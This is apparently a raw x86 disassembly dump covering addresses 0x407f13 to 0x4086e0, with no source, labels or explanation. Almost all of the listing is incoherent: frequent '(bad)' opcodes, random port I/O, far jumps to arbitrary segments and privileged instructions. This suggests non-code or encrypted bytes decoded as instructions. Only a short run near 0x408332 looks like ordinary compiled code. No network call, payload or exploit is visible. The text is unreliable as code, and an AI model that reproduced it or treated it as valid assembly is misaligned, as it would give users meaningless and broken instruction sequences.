  407f13:	inc    ebx
  407f14:	stos   DWORD PTR es:[edi],eax
  407f15:	and    al,BYTE PTR [esi+0x22]
  407f18:	pop    esi
  407f19:	aam    0x24
  407f1b:	push   eax
  407f1c:	inc    esi
  407f1d:	popf   
  407f1e:	mov    ecx,0x5eeaf105
  407f23:	pop    ds
  407f24:	or     eax,0x2fd7aa18
  407f29:	test   al,0x85
  407f2b:	xchg   ebx,eax
  407f2c:	sbb    bh,BYTE PTR [edx+0xf]
  407f2f:	popf   
  407f30:	imul   edx,DWORD PTR [esi+ecx*8+0x64],0xffffffc4
  407f35:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407f36:	jl     0x407f51
  407f38:	xor    cl,BYTE PTR [edi-0xaa7cb5]
  407f3e:	mov    bh,0xf4
  407f40:	jbe    0x407ee3
  407f42:	rol    dh,1
  407f44:	mov    ds:0x12f92487,al
  407f49:	fistp  WORD PTR [eax+0x15]
  407f4c:	sub    DWORD PTR [ecx-0x2f],esi
  407f4f:	pop    ebp
  407f50:	sbb    al,0x15
  407f52:	adc    eax,0x3abd338c
  407f57:	push   ecx
  407f58:	mov    BYTE PTR [eax],bh
  407f5a:	retf   
  407f5b:	adc    eax,0x772b5b4f
  407f60:	jo     0x407fc7
  407f62:	in     al,dx
  407f63:	mov    eax,ds:0xbf29d224
  407f68:	bound  esi,QWORD PTR [esi+0x3992bbba]
  407f6e:	mov    ebp,0xc5c1b1ba
  407f73:	pop    esi
  407f74:	(bad)  
  407f75:	fmul   QWORD PTR [ecx+0x2f]
  407f78:	por    mm3,QWORD PTR [edx+0x55]
  407f7c:	mov    eax,0x55c5e977
  407f81:	mov    ebx,0x882ea944
  407f86:	sbb    BYTE PTR [edx-0x262a33b4],ch
  407f8c:	clc    
  407f8d:	pushf  
  407f8e:	jno    0x407f8d
  407f90:	push   0x54
  407f92:	or     eax,0x4727abe0
  407f97:	stos   DWORD PTR es:[edi],eax
  407f98:	mov    ch,BYTE PTR [esi]
  407f9a:	aam    0x8d
  407f9c:	leave  
  407f9d:	dec    edx
  407f9e:	adc    esp,DWORD PTR [edx+eax*1]
  407fa1:	mov    ebp,DWORD PTR [ebp-0x2]
  407fa4:	rcl    DWORD PTR [eax+ebp*2-0x43],1
  407fa8:	pop    ebx
  407fa9:	mov    ebp,0x5e329eb2
  407fae:	popf   
  407faf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407fb0:	imul   ecx,DWORD PTR [edx-0x7a],0xbaadeac3
  407fb7:	pop    esp
  407fb8:	imul   esp
  407fba:	jecxz  0x407fca
  407fbc:	stos   DWORD PTR es:[edi],eax
  407fbd:	aaa    
  407fbe:	mov    ch,0xf3
  407fc0:	(bad)
  407fc3:	mov    ah,0xd4
  407fc5:	daa    
  407fc6:	lock lea edx,[ecx-0x329186b3]
  407fcd:	(bad)  
  407fce:	jns    0x407fcd
  407fd0:	xlat   BYTE PTR ds:[ebx]
  407fd1:	rcr    DWORD PTR [esi-0x8],0x6c
  407fd5:	retf   
  407fd6:	test   BYTE PTR [eax-0x1c0efbc3],cl
  407fdc:	lock (bad) 
  407fde:	in     eax,0xde
  407fe0:	push   edx
  407fe1:	or     eax,0x70119d72
  407fe6:	ficomp DWORD PTR [esi+0x6bf1d1c8]
  407fec:	sahf   
  407fed:	sbb    DWORD PTR [edi+0x344eb88c],ebx
  407ff3:	and    dh,BYTE PTR [esi+0x59a09ee3]
  407ff9:	mov    WORD PTR [eax+edi*1],es
  407ffc:	push   ebp
  407ffd:	scas   eax,DWORD PTR es:[edi]
  407ffe:	test   edi,esp
  408000:	(bad)  
  408001:	mov    eax,ds:0x8ba08354
  408006:	pop    es
  408007:	xor    al,al
  408009:	in     eax,dx
  40800a:	push   ecx
  40800b:	lds    edx,FWORD PTR [edx]
  40800d:	sub    eax,0x56b61af0
  408012:	or     ah,ah
  408014:	and    ebp,DWORD PTR [edx-0x1985e5a3]
  40801a:	inc    ebx
  40801b:	adc    BYTE PTR [ecx-0x4e],al
  40801e:	push   edi
  40801f:	inc    eax
  408020:	pushf  
  408021:	pop    esp
  408022:	scas   eax,DWORD PTR es:[edi]
  408023:	repnz jecxz 0x408047
  408026:	adc    BYTE PTR [ecx],al
  408028:	jne    0x408003
  40802a:	xchg   esp,eax
  40802b:	jge    0x407ff3
  40802d:	add    al,0x63
  40802f:	mov    ecx,DWORD PTR [esi-0x36]
  408032:	cdq    
  408033:	fwait
  408034:	pop    ds
  408035:	jmp    0x407fd4
  408037:	mov    cl,0xd1
  408039:	das    
  40803a:	pop    ecx
  40803b:	sbb    eax,eax
  40803d:	xlat   BYTE PTR ds:[ebx]
  40803e:	add    al,0x52
  408040:	bound  edi,QWORD PTR [edx]
  408042:	mov    bh,0xf3
  408044:	loopne 0x4080c0
  408046:	cdq    
  408047:	arpl   di,di
  408049:	fucomp st(6)
  40804b:	mov    ah,0xa6
  40804d:	sub    ah,BYTE PTR [ebp-0x7f]
  408050:	adc    bl,BYTE PTR ds:0x7dfa84d6
  408056:	pushf  
  408057:	sbb    BYTE PTR [ebx-0x5086e517],bh
  40805d:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  40805f:	jl     0x408089
  408061:	out    0x5c,eax
  408063:	inc    ecx
  408064:	xor    dl,BYTE PTR ds:0x2083727
  40806a:	lock push esi
  40806c:	js     0x408053
  40806e:	bound  esp,QWORD PTR [esi+0x6d]
  408071:	adc    eax,0xf766d8cd
  408076:	(bad)  
  408077:	loop   0x4080cc
  408079:	cs and eax,0xcf577c0f
  40807f:	push   ecx
  408080:	sbb    dl,BYTE PTR [ebx]
  408082:	sub    esp,0x28
  408085:	imul   edx,DWORD PTR [ebp+0x6306e923],0x717d41e5
  40808f:	dec    esp
  408090:	dec    ecx
  408091:	aad    0x35
  408093:	sbb    ch,BYTE PTR [eax-0x28]
  408096:	sub    DWORD PTR [ecx+esi*8+0x5bf4bf41],esp
  40809d:	arpl   ax,sp
  40809f:	inc    edx
  4080a0:	xchg   ebx,eax
  4080a1:	loop   0x40809a
  4080a3:	push   esp
  4080a4:	loopne 0x408035
  4080a6:	sahf   
  4080a7:	aam    0x72
  4080a9:	adc    eax,0xcd625002
  4080ae:	mov    dh,0x70
  4080b0:	(bad)  [ecx+0x55]
  4080b3:	xlat   BYTE PTR ds:[ebx]
  4080b4:	shr    dl,cl
  4080b6:	sbb    BYTE PTR [eax+0x60],dl
  4080b9:	mov    ah,0x8c
  4080bb:	call   0x1e2a278d
  4080c0:	sub    DWORD PTR [ecx+ecx*8+0x5e],0xffffff9d
  4080c5:	(bad)  
  4080c6:	pop    ecx
  4080c7:	lea    edx,[eax-0x28]
  4080ca:	or     dl,BYTE PTR [ebp-0x57]
  4080cd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4080ce:	nop
  4080cf:	ins    BYTE PTR es:[edi],dx
  4080d0:	jle    0x4080f5
  4080d2:	call   0x7dd2a5ef
  4080d7:	outs   dx,BYTE PTR ds:[esi]
  4080d8:	push   esi
  4080d9:	sbb    ch,BYTE PTR [edi+0x6718ab1a]
  4080df:	adc    ebx,DWORD PTR [edx-0x1f7b07e2]
  4080e5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4080e6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4080e7:	ror    ch,1
  4080e9:	int    0x8a
  4080eb:	or     BYTE PTR [edx],dh
  4080ed:	cmp    eax,0x207d6456
  4080f2:	repnz into 
  4080f4:	and    bl,0xa6
  4080f7:	sub    eax,0xd95b932c
  4080fc:	sti    
  4080fd:	xor    ah,0xe3
  408100:	inc    eax
  408101:	popa   
  408102:	sahf   
  408103:	out    dx,eax
  408104:	mov    esp,0xfaf2ea0f
  408109:	cmp    ebx,esp
  40810b:	test   al,0xe5
  40810d:	(bad)  
  40810e:	aad    0xb1
  408110:	test   bl,0x77
  408113:	pop    edi
  408114:	or     edi,edx
  408116:	or     dh,BYTE PTR [eax]
  408118:	xlat   BYTE PTR ds:[ebx]
  408119:	mov    eax,ds:0x3e9bcb30
  40811e:	mov    ss,WORD PTR [ebp-0x78]
  408121:	outs   dx,DWORD PTR ds:[esi]
  408122:	lods   eax,DWORD PTR ds:[esi]
  408124:	adc    bl,BYTE PTR [edx+eax*8+0x1b2399d5]
  40812b:	xor    eax,0x9f309175
  408130:	repz cbw 
  408133:	stos   BYTE PTR es:[edi],al
  408134:	adc    al,0x4e
  408136:	jg     0x408100
  408138:	scas   al,BYTE PTR es:[edi]
  408139:	out    0x3a,al
  40813b:	fnstenv [ebp+0x7c]
  40813e:	mov    ch,BYTE PTR [ecx-0x4c]
  408141:	rcl    BYTE PTR [edx],cl
  408143:	mov    dh,0xfb
  408145:	hlt    
  408146:	cwde   
  408147:	mov    ch,0x41
  408149:	fdivrp st(5),st
  40814b:	(bad)  
  40814c:	lods   al,BYTE PTR ds:[esi]
  40814d:	xchg   DWORD PTR [eax-0x34],eax
  408150:	mov    edx,0xd2e2d168
  408155:	mov    bl,cl
  408157:	pusha  
  408158:	cli    
  408159:	pop    eax
  40815a:	dec    edi
  40815b:	fs xor dl,dl
  40815e:	inc    ecx
  40815f:	sar    BYTE PTR [ebx-0xd14ad3a],1
  408165:	ret    
  408166:	data16 xor al,0xf7
  408169:	xor    ebp,ecx
  40816b:	fidivr DWORD PTR [edx+esi*1+0x6380c7c6]
  408172:	leave  
  408173:	adc    al,0x82
  408175:	inc    ebp
  408176:	xlat   BYTE PTR ds:[ebx]
  408177:	xlat   BYTE PTR ds:[ebx]
  408178:	jmp    0xd103:0x2a896ef4
  40817f:	lods   al,BYTE PTR ds:[esi]
  408180:	sbb    BYTE PTR [ecx-0x2a602061],dl
  408186:	jg     0x4081cb
  408188:	pop    ds
  408189:	imul   ebp,DWORD PTR [ebx],0x1788d18b
  40818f:	sahf   
  408190:	mov    esp,ebx
  408192:	data16 jge 0x40812d
  408195:	inc    edi
  408196:	xor    edx,DWORD PTR [eax+esi*1]
  408199:	dec    edx
  40819a:	mov    ebx,0xabc423ee
  40819f:	fldcw  WORD PTR [ebx+0x40b2a3]
  4081a5:	jnp    0x408191
  4081a7:	jb     0x40817f
  4081a9:	xor    eax,DWORD PTR ds:0xe0913559
  4081af:	cs cmc 
  4081b1:	clc    
  4081b2:	or     BYTE PTR [ecx-0x6361205b],al
  4081b8:	scas   eax,DWORD PTR es:[edi]
  4081b9:	ins    BYTE PTR es:[edi],dx
  4081ba:	xor    DWORD PTR [ebx-0x57780729],esp
  4081c0:	and    al,0x3b
  4081c2:	or     ecx,DWORD PTR ds:0xaa3bfc57
  4081c8:	or     eax,0x6caece7e
  4081cd:	iret   
  4081ce:	rcr    BYTE PTR [eax-0x3b],1
  4081d1:	push   cs
  4081d2:	mov    dh,BYTE PTR [eax+0x6d7da5ae]
  4081d8:	xor    al,0x66
  4081da:	pop    esp
  4081db:	ja     0x408206
  4081dd:	mov    edx,ss
  4081df:	sub    eax,0xc05086a7
  4081e4:	pop    ecx
  4081e5:	mov    dh,0x74
  4081e8:	dec    ebx
  4081e9:	sub    ecx,DWORD PTR [eax+eiz*2-0x1b]
  4081ed:	and    cl,al
  4081ef:	inc    esi
  4081f0:	cwde   
  4081f1:	inc    esi
  4081f2:	aam    0x3d
  4081f4:	jge    0x4081b3
  4081f6:	shl    BYTE PTR [ecx+0x67179079],cl
  4081fc:	pop    ss
  4081fd:	test   al,0xa6
  4081ff:	clc    
  408200:	adc    edx,DWORD PTR [eax+0x7d866ee]
  408206:	jb     0x4081a7
  408208:	mov    al,0xaf
  40820a:	mov    edx,cs
  40820c:	test   BYTE PTR [ebx-0x5d],ah
  40820f:	dec    eax
  408210:	and    eax,0xc9869042
  408215:	jmp    0x3b4c:0xef5456
  40821c:	or     al,0x7a
  40821e:	out    0x84,al
  408220:	cld    
  408221:	pop    edx
  408222:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408223:	jne    0x408250
  408225:	dec    ebx
  408226:	sub    BYTE PTR [ebx+ebx*1-0x4d],dl
  40822a:	and    al,0x1a
  40822c:	pop    edx
  40822d:	ret    0xe104
  408230:	(bad)  
  408231:	call   0xa452:0x354e0caa
  408238:	ficom  DWORD PTR [ecx]
  40823a:	pop    esi
  40823b:	imul   al
  40823d:	mov    al,ds:0xf170e89a
  408242:	aaa    
  408243:	adc    esi,DWORD PTR [eax]
  408245:	in     al,0xee
  408247:	js     0x40825b
  408249:	in     eax,dx
  40824a:	jg     0x408260
  40824c:	add    edi,DWORD PTR [edi]
  40824e:	aam    0x4c
  408250:	adc    eax,0xfaf67401
  408255:	mov    ch,BYTE PTR [edi-0x5e62f23d]
  40825b:	dec    ecx
  40825c:	or     ax,0x5fd1
  408260:	jo     0x408261
  408262:	hlt    
  408263:	jmp    0x40821a
  408265:	sti    
  408266:	mov    eax,ds:0xa1d851a5
  40826b:	call   0x1fea:0x6e54bee9
  408272:	int3   
  408273:	pop    ecx
  408274:	hlt    
  408275:	(bad)  
  408276:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408277:	pusha  
  408278:	push   ecx
  408279:	add    al,0xd0
  40827b:	jmp    0x19a7:0xa2e0f1de
  408282:	mov    al,ds:0x648460df
  408287:	stos   DWORD PTR es:[edi],eax
  408288:	popa   
  408289:	adc    eax,0xd9579831
  40828e:	pop    es
  40828f:	test   DWORD PTR [edi-0x25a9ad06],ecx
  408295:	mov    WORD PTR [ebp-0x353332f3],?
  40829b:	ja     0x4082b1
  40829d:	cmp    BYTE PTR [ecx],al
  40829f:	stos   BYTE PTR es:[edi],al
  4082a0:	imul   edi,eax,0x3261db3d
  4082a6:	test   DWORD PTR [eax+ebp*4],ebx
  4082a9:	and    BYTE PTR fs:[ebx+ebp*4],bl
  4082ad:	dec    edx
  4082ae:	rcl    BYTE PTR [ebx+0x216343e2],cl
  4082b4:	jne    0x4082fd
  4082b6:	daa    
  4082b7:	jo     0x408257
  4082b9:	sahf   
  4082ba:	jbe    0x408253
  4082bc:	sbb    BYTE PTR [edx-0x34c71545],0x14
  4082c3:	cs cmp al,0x85
  4082c6:	outs   dx,DWORD PTR ds:[esi]
  4082c7:	ins    BYTE PTR es:[edi],dx
  4082c8:	sbb    BYTE PTR ss:0x37708b8,bl
  4082cf:	add    ebx,DWORD PTR [bx]
  4082d2:	test   eax,0x1727183f
  4082d7:	fwait
  4082d8:	test   DWORD PTR [ebx-0x45],ecx
  4082db:	jns    0x408287
  4082dd:	loopne 0x4082b9
  4082df:	pop    esi
  4082e0:	imul   ecx,DWORD PTR [edx+0x3fb7e0f6],0x26aec656
  4082ea:	test   eax,0xbfe6f6d5
  4082ef:	push   0xffffffbe
  4082f1:	or     cl,ch
  4082f3:	push   ds
  4082f4:	in     eax,0x73
  4082f6:	enter  0x49e6,0x42
  4082fa:	mov    bh,BYTE PTR [ebp+0x74f82050]
  408300:	ds xchg ebp,eax
  408302:	or     esp,esp
  408304:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408305:	inc    edi
  408306:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408307:	jge    0x40830a
  408309:	adc    BYTE PTR [ecx],0xe1
  40830c:	pop    es
  40830d:	inc    ecx
  40830e:	test   eax,edx
  408310:	faddp  st(7),st
  408312:	es enter 0x3f4,0xcd
  408317:	addr16 aas 
  408319:	cmp    BYTE PTR [eax+edi*8],bl
  40831c:	stc    
  40831d:	out    dx,al
  40831e:	stos   DWORD PTR es:[edi],eax
  40831f:	or     al,al
  408321:	add    DWORD PTR [eax+0xe],0x11
  408325:	mov    gs,WORD PTR [eax+0x4c58c7ae]
  40832b:	pop    esi
  40832c:	je     0x409789
  408332:	lea    eax,[ebp-0x98]
  408338:	push   eax
  408339:	mov    eax,DWORD PTR [ebp-0x1c]
  40833c:	xor    eax,esi
  40833e:	add    eax,edi
  408340:	push   eax
  408341:	jmp    0x40884c
  408346:	aas    
  408347:	int    0x3c
  408349:	(bad)  
  40834a:	rcr    cl,cl
  40834c:	retf   
  40834d:	aad    0xf3
  40834f:	(bad)  
  408350:	inc    edi
  408351:	sbb    eax,edi
  408353:	(bad)  
  408354:	ja     0x4083bf
  408356:	in     al,dx
  408357:	in     al,0x78
  408359:	js     0x4083c5
  40835b:	jl     0x4083d5
  40835d:	js     0x40831a
  40835f:	push   0xffffff9d
  408361:	add    BYTE PTR [ebp-0x4f04ddef],ch
  408367:	mov    bl,0xbf
  408369:	addr16 out dx,eax
  40836b:	adc    DWORD PTR [ebp-0x20575c41],esp
  408371:	addr16 pop ds
  408373:	add    DWORD PTR [esi],ebx
  408375:	stos   DWORD PTR es:[edi],eax
  408376:	inc    ebx
  408377:	inc    esp
  408378:	sbb    DWORD PTR [ecx-0x2d283a1c],ebp
  40837e:	retf   
  40837f:	push   eax
  408380:	sbb    esp,DWORD PTR [ebp-0x3106aef6]
  408386:	xchg   ecx,eax
  408387:	jecxz  0x408314
  408389:	jne    0x4083a3
  40838b:	pushf  
  40838c:	dec    eax
  40838d:	out    dx,al
  40838e:	and    ebx,0xffffff85
  408391:	loop   0x408403
  408393:	xor    eax,DWORD PTR [ebx-0x4bf801a8]
  408399:	add    al,0x35
  40839b:	out    dx,al
  40839c:	xchg   esp,eax
  40839d:	imul   edi,DWORD PTR [edx+0x5e],0xf
  4083a1:	bound  eax,QWORD PTR [ebx-0x3e4aaeea]
  4083a7:	mov    ch,0xb6
  4083a9:	pusha  
  4083aa:	xchg   esp,eax
  4083ab:	xchg   edx,eax
  4083ac:	mov    ah,0x4
  4083ae:	repnz xchg ebp,eax
  4083b0:	(bad)  
  4083b1:	xor    esi,DWORD PTR [ecx+ebx*8]
  4083b4:	adc    al,dh
  4083b6:	lods   eax,DWORD PTR ds:[esi]
  4083b7:	add    eax,0x586ce8a0
  4083bc:	faddp  st(6),st
  4083be:	ss dec ecx
  4083c0:	(bad)  
  4083c1:	add    al,0xc1
  4083c3:	div    eax
  4083c5:	outs   dx,BYTE PTR ds:[esi]
  4083c6:	sbb    DWORD PTR [esi-0x52],0x2
  4083ca:	(bad)  
  4083cb:	and    BYTE PTR [esi],cl
  4083cd:	inc    edx
  4083ce:	cli    
  4083cf:	inc    esp
  4083d0:	jne    0x408441
  4083d2:	dec    esp
  4083d3:	mov    ds,edi
  4083d5:	cld    
  4083d6:	test   BYTE PTR [edi+0x51],dl
  4083d9:	mov    WORD PTR [edi],?
  4083db:	(bad)  
  4083dc:	or     eax,0x93475606
  4083e1:	iret   
  4083e2:	fsubr  DWORD PTR [ebx-0x46a12bbc]
  4083e8:	mov    dh,0x3a
  4083ea:	dec    ebx
  4083eb:	cdq    
  4083ec:	out    dx,al
  4083ed:	outs   dx,BYTE PTR ds:[esi]
  4083ee:	cmc    
  4083ef:	call   0x8e21:0xe390e39e
  4083f6:	frstor [eax+0x3f7e7f05]
  4083fc:	push   ebp
  4083fd:	push   ds
  4083fe:	mov    ah,0xf3
  408400:	fisubr WORD PTR [ebx]
  408402:	das    
  408403:	xor    edx,eax
  408405:	pop    DWORD PTR [ecx+0x18]
  408408:	jnp    0x4083a7
  40840a:	ret    
  40840b:	enter  0xc53d,0x5c
  40840f:	pop    ecx
  408410:	or     DWORD PTR [esi+0x57],esp
  408413:	retf   
  408414:	sti    
  408415:	xchg   ebx,eax
  408416:	int3   
  408417:	and    eax,0x2adeb677
  40841c:	mov    ebp,0xfa87a785
  408421:	mov    al,0x3a
  408423:	test   DWORD PTR es:[edi],edi
  408426:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408427:	fdivr  st(0),st
  408429:	aas    
  40842a:	jp     0x40849f
  40842c:	jp     0x4083fa
  40842e:	(bad)  
  40842f:	mov    edi,0xaefc93ef
  408434:	cmc    
  408435:	fadd   QWORD PTR [edx+0x8d652c6]
  40843b:	xor    DWORD PTR [esi+0x5639ce18],ebx
  408441:	lods   eax,DWORD PTR ss:[esi]
  408443:	adc    edi,DWORD PTR [eax+ecx*4]
  408446:	inc    eax
  408447:	pop    ss
  408448:	sub    DWORD PTR [ecx-0x2e483b13],esp
  40844e:	inc    edi
  40844f:	jb     0x4083f5
  408451:	mov    ebp,0x59ce1ed1
  408456:	(bad)  
  408457:	lea    esp,[edi]
  408459:	sub    DWORD PTR [edi-0x39],ebx
  40845c:	mov    esp,0x7ac50d35
  408461:	xchg   edi,eax
  408462:	addr16 sub al,0x69
  408465:	aam    0x27
  408467:	lock fst QWORD PTR [esi+eax*1-0x378b6356]
  40846f:	retf   0x432
  408472:	or     edx,DWORD PTR [ebp+0x2]
  408475:	lods   al,BYTE PTR ds:[esi]
  408476:	sti    
  408477:	mov    al,0x9d
  408479:	rcl    BYTE PTR [esi-0x56a17387],cl
  40847f:	fimul  WORD PTR [esi-0x69]
  408482:	aas    
  408483:	or     al,0xc7
  408485:	push   es
  408486:	(bad)  
  408487:	in     al,dx
  408488:	sub    edx,DWORD PTR [eax-0x4d8c810b]
  40848e:	ds shr ebp,cl
  408491:	aad    0xb4
  408493:	sahf   
  408494:	test   al,0x89
  408496:	scas   eax,DWORD PTR es:[edi]
  408497:	ins    DWORD PTR es:[edi],dx
  408498:	loop   0x40842f
  40849a:	out    0x9b,eax
  40849c:	pop    ecx
  40849d:	ficom  WORD PTR [edx-0x24]
  4084a0:	mov    dl,BYTE PTR [esp+ebp*1+0x5150fa0a]
  4084a7:	mov    bh,BYTE PTR [esi+eax*1+0x606fba9a]
  4084ae:	sub    al,0x16
  4084b0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4084b1:	xor    eax,0xc9c1ce43
  4084b6:	or     cl,BYTE PTR [ecx-0x5dcda877]
  4084bc:	fwait
  4084bd:	dec    ebp
  4084be:	call   0x5cecaad3
  4084c3:	and    eax,0x4381827f
  4084c8:	pop    esp
  4084c9:	or     DWORD PTR [esi],0x8
  4084cc:	shl    BYTE PTR [edx-0x3b],0xe4
  4084d0:	sbb    BYTE PTR [ecx+eiz*1],dl
  4084d3:	int3   
  4084d4:	mov    esi,0x47726512
  4084d9:	into   
  4084da:	pop    es
  4084db:	into   
  4084dc:	sar    DWORD PTR ds:0x524d116e,1
  4084e2:	cmp    al,0x5c
  4084e4:	ror    bl,1
  4084e6:	(bad)  
  4084e7:	xchg   edi,eax
  4084e8:	adc    esp,edi
  4084ea:	pusha  
  4084eb:	xchg   DWORD PTR [ebp-0x1a510c90],esp
  4084f1:	sub    al,BYTE PTR [ebx+ebp*1]
  4084f4:	icebp  
  4084f5:	imul   ebp,DWORD PTR [ebx+0x3e0e1938],0xc047235b
  4084ff:	sbb    BYTE PTR [eax-0x46257a54],cl
  408505:	mov    ds:0xae29451c,al
  40850a:	in     al,0x15
  40850c:	add    DWORD PTR [edi+0xb],0xb4e964a4
  408513:	test   eax,0xb497540f
  408518:	cmp    BYTE PTR [ecx],ah
  40851a:	mov    ebx,0xf9d47141
  40851f:	mov    ds:0x4f70c5d7,al
  408524:	nop
  408525:	out    dx,al
  408526:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408527:	sub    BYTE PTR [esi-0x5f],bl
  40852a:	call   0xf27c:0x89b4dc66
  408531:	xor    ch,bl
  408533:	cmp    eax,DWORD PTR [edx-0x175677e5]
  408539:	mov    WORD PTR [ecx+0x2a5f73e8],?
  40853f:	dec    ebx
  408540:	mov    al,ds:0x47406cd1
  408545:	xchg   DWORD PTR [ebp-0x24],ecx
  408548:	test   BYTE PTR [eax-0x63ccd4e5],dl
  40854e:	fidivr WORD PTR [esi+0x5c]
  408551:	xchg   ebp,eax
  408552:	outs   dx,DWORD PTR ds:[esi]
  408553:	jno    0x4085c8
  408555:	int    0x7
  408557:	sub    dl,BYTE PTR [eax-0x26]
  40855a:	adc    al,0xb9
  40855c:	sbb    BYTE PTR [ebx],ch
  40855e:	dec    edi
  40855f:	xchg   esp,eax
  408560:	or     BYTE PTR [ebp-0x7b],cl
  408563:	and    DWORD PTR [ecx+edi*8-0xa3359c3],ebx
  40856a:	test   dh,ch
  40856c:	pop    ebp
  40856d:	or     al,BYTE PTR [eax-0x21f98271]
  408573:	adc    edi,DWORD PTR [edi+ebp*4]
  408576:	cmp    eax,DWORD PTR [esi+0x54e5268d]
  40857c:	jecxz  0x408520
  40857e:	dec    ebp
  40857f:	leave  
  408580:	push   ebp
  408581:	xor    ch,BYTE PTR [ebx+eiz*1-0x43e305d0]
  408588:	jmp    0x18d9:0x7e4b48ce
  40858f:	dec    esp
  408590:	and    BYTE PTR [esi+0x6d],dh
  408593:	pop    ecx
  408594:	stos   DWORD PTR es:[edi],eax
  408595:	inc    eax
  408596:	jle    0x4085e5
  408598:	jae    0x408611
  40859a:	xor    ah,BYTE PTR [ebx-0x5fd78be7]
  4085a0:	iret   
  4085a1:	lods   eax,DWORD PTR ds:[esi]
  4085a2:	shl    al,0x9a
  4085a5:	sbb    cl,ch
  4085a7:	shl    DWORD PTR [edi-0x71],0xf8
  4085ab:	addr16 in al,dx
  4085ad:	cwde   
  4085ae:	jg     0x408548
  4085b0:	mov    edx,0x766fe8c0
  4085b5:	fadd   QWORD PTR [ecx]
  4085b7:	shr    BYTE PTR [edi+0x14],cl
  4085ba:	jecxz  0x40861a
  4085bc:	or     bl,bh
  4085be:	push   ebx
  4085bf:	and    al,0x13
  4085c1:	lock in al,0x31
  4085c4:	push   edi
  4085c5:	lock (bad) 
  4085c7:	sbb    BYTE PTR [eax-0x4da4012],ch
  4085cd:	lahf   
  4085ce:	out    dx,al
  4085cf:	xor    BYTE PTR [edi+edi*8-0xb],dl
  4085d3:	jge    0x408563
  4085d5:	xchg   esp,eax
  4085d6:	xchg   DWORD PTR [ebx-0x3b],ebx
  4085d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4085da:	or     eax,esi
  4085dc:	std    
  4085dd:	sbb    dh,BYTE PTR [esp+esi*8]
  4085e0:	dec    edx
  4085e1:	adc    eax,DWORD PTR [esi]
  4085e3:	test   al,0x8a
  4085e5:	dec    eax
  4085e6:	add    ah,cl
  4085e8:	aam    0xb1
  4085ea:	inc    ebp
  4085eb:	pop    edx
  4085ec:	cld    
  4085ed:	mov    ebx,0xa8beb0f9
  4085f2:	xor    al,0xd6
  4085f4:	sbb    DWORD PTR [eax],0xffffff80
  4085f7:	retf   0xa6d1
  4085fa:	xchg   BYTE PTR [esi],ah
  4085fc:	push   eax
  4085fd:	mov    al,BYTE PTR [edi+0x148b629f]
  408603:	sub    dl,ah
  408605:	add    ah,BYTE PTR [ecx-0x1038fe50]
  40860b:	jne    0x4085aa
  40860d:	sbb    BYTE PTR [edx+0x49f4b08e],al
  408613:	mov    ah,0x69
  408615:	ds cdq 
  408617:	or     al,0x34
  408619:	es pop edx
  40861b:	mov    ebx,0xddaefa8e
  408620:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408621:	arpl   WORD PTR [ebp+0x27],si
  408624:	or     DWORD PTR [eax+0x2d752cf7],esp
  40862a:	test   DWORD PTR [edi-0x163a43dd],edi
  408630:	ins    DWORD PTR es:[edi],dx
  408631:	sbb    eax,0x319abb1a
  408636:	sub    ebp,DWORD PTR [ebx+ecx*2+0x300f2f36]
  40863d:	imul   esp,DWORD PTR [ebx+0x17],0xf3683d9d
  408644:	or     BYTE PTR [ebx],bl
  408646:	cmp    al,bh
  408648:	loopne 0x408610
  40864a:	or     ecx,DWORD PTR [eax+eiz*2+0x50]
  40864e:	push   ebx
  40864f:	xchg   DWORD PTR [eax+0x63],ecx
  408652:	retf   
  408653:	jle    0x4086a4
  408655:	leave  
  408656:	xchg   DWORD PTR [ebx-0x1e],esp
  408659:	ret    
  40865a:	push   es
  40865b:	je     0x408639
  40865d:	mov    esp,0x4ccee5eb
  408662:	mov    gs,WORD PTR [esi+eax*8+0x5a]
  408666:	adc    DWORD PTR [eax],esp
  408668:	(bad)  
  408669:	or     BYTE PTR [ebx-0x6d],bh
  40866c:	jp     0x408638
  40866e:	rcl    BYTE PTR [ebp+0x7f83e0f0],cl
  408674:	retf   
  408675:	mov    edx,0x78c60cf8
  40867a:	je     0x408622
  40867c:	lods   eax,DWORD PTR ds:[esi]
  40867d:	or     ah,cl
  40867f:	dec    ecx
  408680:	fdivrp st(0),st
  408682:	jae    0x408690
  408684:	pop    esp
  408685:	daa    
  408686:	sbb    eax,0xef4391fb
  40868b:	mov    ds:0x63d2d84,eax
  408690:	mov    cl,0x49
  408692:	or     BYTE PTR [esi+0x4c17dfa3],bh
  408698:	xchg   ecx,eax
  408699:	xchg   ecx,eax
  40869a:	dec    DWORD PTR [edx-0x16]
  40869d:	clc    
  40869e:	or     DWORD PTR [ecx-0x67],ebx
  4086a1:	fwait
  4086a2:	or     al,0x8a
  4086a4:	pushf  
  4086a5:	(bad)
  4086a9:	popa   
  4086aa:	pop    ss
  4086ab:	jo     0x4086ec
  4086ad:	push   0xffffff87
  4086af:	shr    DWORD PTR [ebx-0x23],cl
  4086b2:	adc    al,0x3d
  4086b4:	push   ecx
  4086b5:	dec    edx
  4086b6:	ja     0x40868e
  4086b8:	xor    ah,al
  4086ba:	div    ecx
  4086bc:	add    DWORD PTR [ebx-0x76],edi
  4086bf:	ins    DWORD PTR es:[edi],dx
  4086c0:	in     eax,0x3
  4086c2:	mov    DWORD PTR [ecx],edi
  4086c4:	daa    
  4086c5:	cli    
  4086c6:	adc    DWORD PTR [edi-0x68],ebp
  4086c9:	jle    0x4086d5
  4086cb:	(bad)  
  4086cc:	or     ecx,edi
  4086ce:	sub    al,0xe1
  4086d0:	mov    ds,WORD PTR [ebp-0x4f]
  4086d3:	xor    DWORD PTR [esi-0x78],0x32edb9d2
  4086da:	sbb    BYTE PTR [ebx-0x20eb1c48],ah
  4086e0:	mov    al,ds:0x77558107
